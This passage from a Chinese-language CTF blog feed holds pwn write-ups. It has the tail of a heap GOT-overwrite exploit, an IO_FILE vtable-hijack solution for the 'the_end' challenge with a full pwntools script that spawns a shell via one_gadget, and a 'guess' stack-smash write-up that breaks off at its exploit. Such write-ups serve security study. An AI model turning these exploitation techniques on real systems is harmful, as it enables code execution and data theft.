class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(stkof.got[<span class="string">&#x27;free&#x27;</span>]) + p64(stkof.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        stkof.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(stkof.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Vtable-Hijack(the_end)</title>
    <url>/2020/04/09/Vtable-Hijack(the_end)/</url>
    <content><![CDATA[<p>​        关于IO FILE 中的vtable劫持。<span id="more"></span>    </p>
<p>​        因为在wctf2020碰到了一个贼简单(没做出来🙃)的io重定向题目，而且刘老板刷how2heap的时候也碰到了一些io相关的题目，所以我感觉该稍微了解了解pwn中的io。</p>
<h2 id="0x00-IO入门-——-基本结构体"><a href="#0x00-IO入门-——-基本结构体" class="headerlink" title="0x00 . IO入门 —— 基本结构体"></a>0x00 . IO入门 —— 基本结构体</h2><p>​        _IO_FILE是最基本的io流相关结构，长这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br></pre></td></tr></table></figure>

<p>​        _IO_FILE中有一个指针成员为chain，可以将进程中所有的_IO_FILE结构串起来，构成链表，链表头部存储在全局变量_IO_list_all中。再清理io流的时候会遍历此链表。</p>
<p>​        进程一开始，本来啥io流都没有，但是没有io就不能实现交互，所以所有进程都存在三个自动打开的io流：stdin，stdout，stderr。分别控制程序的输入，输出和报错。这三个io流都是_IO_FILE结构，在符号表中是这样存储的:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure>

<p>​        _IO_FILE_plus在_IO_FILE的基础上，加上一个指向_IO_jump_t 结构体，叫vtable的指针，又封装成了一个结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​        而这个vtable(虚表)指向的结构体，是一张函数表，存了许多与io操作相关的函数。io操作会通过交叉引用间接访问到函数表中的相关函数。这张函数表长这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  **JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="0x01-Vtable-劫持"><a href="#0x01-Vtable-劫持" class="headerlink" title="0x01 . Vtable 劫持"></a>0x01 . Vtable 劫持</h2><p>​        vtable，或者叫虚表。IO的相关操作中，某些函数会调用到虚表中的值。比如exit()会在一系列的交叉引用中调用到其虚表中的setbuf()，printf()会用到xput()等等。详细的调用只能查查看相关函数的源代码了。。。以后再详述。（🕊🕊🕊）</p>
<p>​        虚表说起来跟got表plt表差不多(个人理解)，都可以通过劫持表来控制程序流程。但不同的是，got表可写，虚表不能直接改写，这也就限制了我们不能直接修改虚表使其指向目标函数。但是我们可以通过伪造虚表达到同样效果。大致思路如下：</p>
<ol>
<li>要找到虚表，得先找到它所在的结构体，即_IO_FILE_plus位于哪里。这里我们需要知道：如果文件流是以fopen()的方式打开的，那么文件流会存在堆上；而如果是stdin，stdout，stderr则是存在库文件中。本文章仅考虑后者的情况。</li>
<li>首先我们要确定库文件的版本，根据不同版本确定vtable相对于_IO_FILE_plus开始地址的偏移量。在libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。</li>
<li>根据偏移我们就能求出虚表的地址，就能伪造虚表劫持程序流程了。libc2.23版本下虚表的伪造不存在安全检测，更高的libc版本里则需要讨论保护绕过了。</li>
<li>之后还需要找到函数调用过虚表中的哪个函数(victim_function)，通过固定偏移和程序中的其他漏洞，进行任意写，将victim_function换成one_gadget地址，就能getshell。</li>
</ol>
<h2 id="0x02-the-end"><a href="#0x02-the-end" class="headerlink" title="0x02 . the_end"></a>0x02 . the_end</h2><h3 id="1-Analysis"><a href="#1-Analysis" class="headerlink" title="1 . Analysis"></a>1 . Analysis</h3><p>​        例行公事如下：</p>
<img src="https://s1.ax1x.com/2020/07/14/UNFNnA.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNFNnA.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1" style="zoom:67%;" />

<p>​        main函数如下，除此之外没有其他乱七八糟的函数了。。</p>
<img src="https://s1.ax1x.com/2020/07/14/UNFJ6H.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNFJ6H.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2" style="zoom: 67%;" />

<p>​        在for循环里面可以看到，程序允许用户进行五次输入操作的循环，每次循环中，将用户的第一次输入作为一个地址（可写入8个字节，对于64位程序来说恰好为一个地址），用户的第二次输入就将写在这个地址中（可写入1个字节）。</p>
<p>​        也就是说，我们可以实现任意地址写，不过只能写5个字节。</p>
<p>​        主函数中，for循环的任意写结束后就是exit函数了，而且题目“the_end”也很明显地提示了漏洞应该在结尾处，所以聪明机智的我考虑捯饬捯饬exit函数。</p>
<h3 id="2-Attack"><a href="#2-Attack" class="headerlink" title="2 . Attack"></a>2 . Attack</h3><p>​        去了解之后知道了exit()函数作用是结束子进程，返回给父进程，那当然需要清理IO流咯。又了解到它清理IO流时，系统会遍历IO_list_all，调用IO_2_1_stdout_，再调用vtable 中 _setbuf 函数。</p>
<p>​        用ida打开libc-2.23.so，先找出IO_2_1_stdout_符号，之后看结构可以确定，0x3C56F8处的就是虚表。</p>
<img src="https://s1.ax1x.com/2020/07/14/UNFYXd.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNFYXd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3" style="zoom: 50%;" />

<p>​        根据虚表在64位程序中的偏移，可以求出虚表的地址。</p>
<p>​        查一下上面的虚函数表，可以计算出setbuf相对于vtable的偏移量为11 * 0x8 = 0x58（64位）。根据setbuf的偏移，可以求出setbuf的地址。</p>
<p>​        所以我们要做的就是：伪造一个虚表，将fake_vtabel+0x58的地方改成one_gadget的地址，再将虚表指向伪造的虚表。然后函数调用到setbuf的时候就会定位到伪造虚表中的one_gadget地址。</p>
<p>​        因为我们只能写入5个字节，所以fake_vtable+0x58与one_gadget，虚表和伪造虚表的偏移都不能太大。所以考虑将虚表定位在虚表的附近，用两个字节来覆写，然后再用剩下三个字节将one_gadget写入到fake_vtable+0x58。</p>
<p>​        最后getshell时需要注意，程序中的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">close(<span class="number">1</span>);</span><br><span class="line">close(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>​        两行代码将输出流错误流关掉了，所以最后我们getshell的时候没有回显，具体对策是最后getshell后，进行io重定向，将输出流重定向到输入流，即使用如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cat flag.txt 1&gt;&amp;0</span><br></pre></td></tr></table></figure>



<h3 id="3-Exploit（from-CTF-Wiki😓）"><a href="#3-Exploit（from-CTF-Wiki😓）" class="headerlink" title="3.Exploit（from CTF-Wiki😓）"></a>3.Exploit（from CTF-Wiki😓）</h3><p>​        由于莫名其妙的原因，我在ubuntu中运行程序的时候，只能进行7次输入，然后就直接退出了。。。。也不知道自己写的exp对不对，还是贴一下CTF-Wiki的吧。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;the_end&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">rem = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> rem ==<span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;150.109.44.250&#x27;</span>,<span class="number">20002</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input your token:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep_ad = p.recvuntil(<span class="string">&#x27;, good luck&#x27;</span>,drop=<span class="literal">True</span>).split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">libc_base = long(sleep_ad,<span class="number">16</span>) - libc.symbols[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02b0</span></span><br><span class="line">vtables =     libc_base + <span class="number">0x3C56F8</span></span><br><span class="line"></span><br><span class="line">fake_vtable = libc_base + <span class="number">0x3c5588</span></span><br><span class="line">target_addr = libc_base + <span class="number">0x3c55e0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base: &#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;one_gadget:&#x27;</span>,<span class="built_in">hex</span>(one_gadget)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;exit_addr:&#x27;</span>,<span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    p.send(p64(vtables+i))</span><br><span class="line">    p.send(p64(fake_vtable)[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.send(p64(target_addr+i))</span><br><span class="line">    p.send(p64(one_gadget)[i])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>​        </p>
<p>​        </p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2018网鼎pwn (guess复现)</title>
    <url>/2020/04/13/guess/</url>
    <content><![CDATA[<p>​        2018网鼎pwn题复现与学习。<span id="more"></span></p>
<p>​        因为网鼎、铁三、国赛差不多了，而且刘老板也给了建议，就决定来复现一下2018网鼎的pwn题。毕竟赛题比一般的旧题目含金量更多，能学到很多东西。</p>
<p>​        写题解之前先贴一些铺垫知识，都是这个题目会用到的，也是新学到的。</p>
<h2 id="0x00-Stack-Smash"><a href="#0x00-Stack-Smash" class="headerlink" title="0x00 . Stack Smash"></a>0x00 . Stack Smash</h2><p>​        这个技术算是栈溢出技术的一种，也收录在CTF-Wiki中。</p>
<p>​        对于开启了canary保护的程序，我们不能直接进行栈溢出，因为会破坏canary的值。</p>
<img src="https://s1.ax1x.com/2020/07/14/UNPENT.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPENT.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" />

<p>​        如果函数返回时检查到canary被破坏了，就会跳转到__stack_chk_fail()函数开始执行。</p>
<p>​        看一下库文件中的__stack_chk_fail()及其引用函数：</p>
<p><img src="https://s1.ax1x.com/2020/07/14/UNPFH0.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPFH0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<img src="https://s1.ax1x.com/2020/07/14/UNPAEV.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPAEV.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412191742905" style="zoom:67%;" />

<p>​        再看一下源码(版本为glibc-2.23)：</p>
<img src="https://s1.ax1x.com/2020/07/14/UNPQD1.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPQD1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412195528076" style="zoom:67%;" />

<img src="https://s1.ax1x.com/2020/07/14/UNPMuR.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPMuR.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412195511596" style="zoom:67%;" />

<p>​        我们可以看到，<code>__stack_chk_fail()</code>会调用<code>__fortify_fail()</code>，而后者输出了一行字符串，实际上是用来提示用户该程序出错，而__libc_argv[0]中存的就是程序名。</p>
<p>​        而该变量作为命令行参数，存在main函数的栈帧上，也就是说，如果我们在栈上可以进行足够长的输入，就能覆盖canary，再将想要泄露的target_addr覆盖argv[0]，此时系统监测到溢出，执行<code>__stack_chk_fail()</code>和<code>__fortify_fail()</code>就能输出target_get的内容。</p>
<p>​        用这样的栈溢出理论上实现了任意读（满足读权限），但是泄露了之后系统就关闭进程，无法继续攻击。</p>
<h2 id="0x01-Linux-父子进程"><a href="#0x01-Linux-父子进程" class="headerlink" title="0x01 . Linux 父子进程"></a>0x01 . Linux 父子进程</h2><p>​        在linux程序中，一般用fork函数来创建一个新的子进程。</p>
<p><img src="https://s1.ax1x.com/2020/07/14/UNPlHx.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPlHx.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        这个新的子进程理论上算是原进程的一个副本，执行fork()时，系统先为子进程分配资源，再将原进程的一系列数据和变量复制到子进程中。这个复制的结果是，数据和变量的值都一样，在系统中的虚拟地址是一样的，但是物理地址不同，也就是说将数据复制到了另一个物理地址，即副本。</p>
<p>​        而新进程原进程在fork()执行之后，返回值为子进程的id。那么对于v1变量，原进程的值为子进程的id，子进程没有子进程，v1自然为0。如果返回值为-1，即创建进程失败。</p>
<p>​        当fork()执行结束，父子进程的下一行代码都是if(v1 == -1)，都从这里开始执行。</p>
<h2 id="0x02-GUESS"><a href="#0x02-GUESS" class="headerlink" title="0x02 . GUESS"></a>0x02 . GUESS</h2><h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>​        用ida打开文件可以看见，程序一开始就将flag.txt读取到了栈上:</p>
<img src="https://s1.ax1x.com/2020/07/14/UNP3E6.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNP3E6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200413155246955" style="zoom: 80%;" />

<p>​        不过程序中存在canary保护。</p>
<img src="https://s1.ax1x.com/2020/07/14/UNPG4O.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPG4O.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200413155332703" style="zoom:80%;" />

<p>​        跑一下，其实就是让你输入flag。输入AAAAAAAA。</p>
<p>​        gdb调试看看栈上的情况，可以看到flag的确在栈上（此处用了本地的flag）。</p>
<p><img src="https://s1.ax1x.com/2020/07/14/UNPm34.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPm34.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1"></p>
<p>​        可以得知以下部分变量的地址。</p>
<table>
<thead>
<tr>
<th align="center">Variable</th>
<th align="center">Addr</th>
</tr>
</thead>
<tbody><tr>
<td align="center">argv[0]</td>
<td align="center">0x7fffffffdd88</td>
</tr>
<tr>
<td align="center">flag.txt</td>
<td align="center">0x7fffffffdc30</td>
</tr>
<tr>
<td align="center">User Input</td>
<td align="center">0x7fffffffdc60</td>
</tr>
</tbody></table>
<p>​        其中argv[0]为命令行参数，存的是程序路径及程序名“GUESS”。之所以要提到argv[0]是因为此处可以用到本文上述的花式栈溢出技巧stack smash。因为程序中的用户输入是用gets()实现的，因此用我们可以用input将足够长的padding和puts的got表值覆盖到argv[0]，从而泄露libc基址。(0xdd88 - 0xdc60 == 0x128)</p>
<p>​        得到了libc的地址，我们还需要泄露另一个变量environ。这个变量存的是程序的栈基址，我们可以根据flag.txt在栈上的固定偏移，来确定flag的实际地址。environ变量被存在符号表中，所以也可以通过上述的stack smash泄露got表的方式得到。</p>
<p>​        gdb下断点得到当前的栈地址。</p>
<p><img src="https://s1.ax1x.com/2020/07/14/UNPeCF.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPeCF.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">environ - flag_aar == <span class="number">0x168</span></span><br><span class="line">environ - <span class="number">0x168</span> == flag_aar</span><br></pre></td></tr></table></figure>

<p>​        现在只要再一次进行stack smash泄露出栈上的flag即可。</p>
<h3 id="B-Exploit"><a href="#B-Exploit" class="headerlink" title="B . Exploit"></a>B . Exploit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;B&#x27;</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span 